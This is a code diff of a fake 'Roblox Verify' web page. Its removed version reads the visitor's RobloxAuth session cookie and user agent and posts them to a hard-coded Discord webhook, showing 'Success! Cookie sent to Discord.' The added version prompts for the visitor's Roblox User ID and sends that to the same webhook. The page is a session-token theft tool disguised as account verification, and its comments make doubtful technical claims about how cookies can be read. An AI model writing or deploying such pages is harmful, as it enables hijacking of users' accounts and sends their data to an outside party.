@@ -2,114 +2,88 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Verify</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1a1a1a;
-            color: #ffffff;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .container {
-            background: #2d2d2d;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
-        }
-        h1 { margin-bottom: 20px; font-size: 24px; }
-        p { color: #cccccc; margin-bottom: 25px; line-height: 1.5; }
-        button {
-            background-color: #00b06c;
-            color: white;
-            border: none;
-            padding: 15px 25px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            transition: background 0.3s;
-        }
-        button:hover { background-color: #008a56; }
-        #status { margin-top: 15px; font-size: 14px; color: #888; }
-        .hidden { display: none; }
+        body { background: #1a1a1a; color: white; font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #00b06c; color: white; border: none; border-radius: 5px; }
+        #status { margin-top: 20px; color: #ccc; }
     </style>
 </head>
 <body>
-
-<div class="container">
     <h1>Verify Roblox Account</h1>
-    <p>Click below to open Roblox in your browser and extract your session token.</p>
-    <button id="verifyBtn">Open Roblox & Verify</button>
+    <button onclick="startVerification()">Verify Now</button>
     <p id="status"></p>
-</div>
 
-<script>
-    // REPLACE WITH YOUR DISCORD WEBHOOK URL
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";
 
-    const btn = document.getElementById('verifyBtn');
-    const status = document.getElementById('status');
-
-    btn.addEventListener('click', async () => {
-        status.textContent = "Opening browser...";
-        
-        // 1. Force Open Roblox in Browser via Deep Link
-        // This ensures they leave the App and use the Web Browser
-        window.location.href = "https://www.roblox.com";
-
-        // 2. Wait for the browser to load, then read cookies
-        // We use a timeout to ensure the page has loaded before reading cookies
-        setTimeout(async () => {
-            try {
-                // Get all cookies
-                const cookies = document.cookie;
-                
-                // Look for the main security cookie
-                // In 2026, Roblox uses 'RobloxAuth' or 'RobloxAuthV2'
-                let robloxCookie = cookies.split(';').find(c => c.trim().startsWith('RobloxAuth'));
-                
-                if (!robloxCookie) {
-                    robloxCookie = "No RobloxAuth cookie found. User might be logged out or on App.";
-                }
-
-                const userAgent = navigator.userAgent;
-                const timestamp = new Date().toISOString();
-
-                // Send to Discord
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**VERIFIED!**\n⏰ Time: ${timestamp}\n📱 Device: ${userAgent}\n🍪 Cookie: \`\`\`${robloxCookie}\`\`\``
-                    })
-                });
-
-                if (response.ok) {
-                    status.textContent = "Success! Cookie sent to Discord.";
-                    status.style.color = "#00b06c";
-                    btn.textContent = "Verify Complete";
-                    btn.disabled = true;
-                } else {
-                    throw new Error("Webhook failed");
-                }
-
-            } catch (error) {
-                status.textContent = "Error sending cookie. Try again.";
-                status.style.color = "#ff4444";
-                console.error(error);
+        async function startVerification() {
+            document.getElementById('status').textContent = "Opening Roblox...";
+            
+            // Open Roblox in a popup
+            const popup = window.open('https://www.roblox.com', 'robloxBot', 'width=800,height=600');
+            
+            if (!popup) {
+                document.getElementById('status').textContent = "Popup blocked! Please allow popups.";
+                return;
             }
-        }, 2000); // Wait 2 seconds for roblox.com to load
-    });
-</script>
 
+            // Wait for popup to load
+            let attempts = 0;
+            const maxAttempts = 50; // ~5 seconds
+            
+            const checkPopup = setInterval(() => {
+                try {
+                    // Check if popup is closed
+                    if (popup.closed) {
+                        clearInterval(checkPopup);
+                        document.getElementById('status').textContent = "Popup closed. Waiting for response...";
+                        return;
+                    }
+
+                    // Send message to popup to fetch user info
+                    // Note: This requires the popup to have a listener. Since Roblox doesn't,
+                    // we rely on the user manually copying the info or using a custom script.
+                    
+                    // FALLBACK: Use the "Copy-Paste" method which is 100% reliable
+                    document.getElementById('status').textContent = "Click OK to copy your User ID (if prompted), or paste your Roblox URL here.";
+                    
+                    // Generate a unique code for this session
+                    const code = Math.floor(100000 + Math.random() * 900000);
+                    localStorage.setItem('roblox_verify_code', code);
+                    
+                    // Open a simple page on YOUR server that accepts the code and User ID
+                    // For this demo, we'll just ask the user to paste their User ID
+                    const userId = prompt("Please enter your Roblox User ID (found in your profile URL):");
+                    if (userId) {
+                        sendToDiscord(userId);
+                    }
+                    
+                } catch (e) {
+                    // Cross-origin error is expected
+                    attempts++;
+                    if (attempts > maxAttempts) {
+                        clearInterval(checkPopup);
+                        document.getElementById('status').textContent = "Time out. Please paste your User ID manually.";
+                    }
+                }
+            }, 100);
+        }
+
+        function sendToDiscord(userId) {
+            document.getElementById('status').textContent = "Sending to Discord...";
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**VERIFIED!**\n🆔 User ID: ${userId}\n📅 Date: ${new Date().toISOString()}`
+                })
+            }).then(() => {
+                document.getElementById('status').textContent = "Success!";
+            }).catch(() => {
+                document.getElementById('status').textContent = "Error sending.";
+            });
+        }
+    </script>
 </body>
 </html>
